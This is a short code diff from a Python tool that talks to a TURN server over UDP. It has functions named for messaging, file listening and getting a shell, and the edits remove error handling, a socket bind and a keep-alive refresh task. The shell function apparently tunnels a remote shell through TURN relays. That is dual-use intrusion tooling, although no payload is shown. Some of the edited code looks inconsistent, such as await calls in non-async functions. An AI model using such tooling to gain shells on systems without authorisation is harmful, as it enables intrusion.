@@ -76,9 +76,6 @@ def start_quick_message_client(ip, port):
             print("Response (hex):", response.hex())
             read_server_response(response)
 
-    except BlockingIOError:
-        # Ignore this error and continue listening
-        await asyncio.sleep(0.1)
     except Exception as e:
        print(f"Error: {e}")    
 
@@ -290,7 +287,6 @@ def start_file_listener(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setblocking(False)
     sock.settimeout(None)  # Set a timeout for the response (5 seconds)
-    sock.bind(('0.0.0.0', int(port)))
     
     try:
         # Send the Allocate packet to the TURN server
@@ -298,7 +294,7 @@ def start_file_listener(ip, port):
         sock.sendto(alloc_packet, TURN_SERVER)
         
         # Receive the response from the TURN server
-        response, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 4096)
+        response, addr = sock.recvfrom(4096)
         print(f"Received response from {addr}")
 
         if response:
@@ -393,9 +389,6 @@ def get_shell_client(ip ,port):
         print("No response received (timeout).")
     except Exception as e:
        print(f"Error: {e}")    
-            
-    ## Maintain connection with refresh packets
-    asyncio.create_task(send_refresh(sock, TURN_SERVER))
     
     ## Begin Getting shell
     # Channel number must be between those values (in RFC)
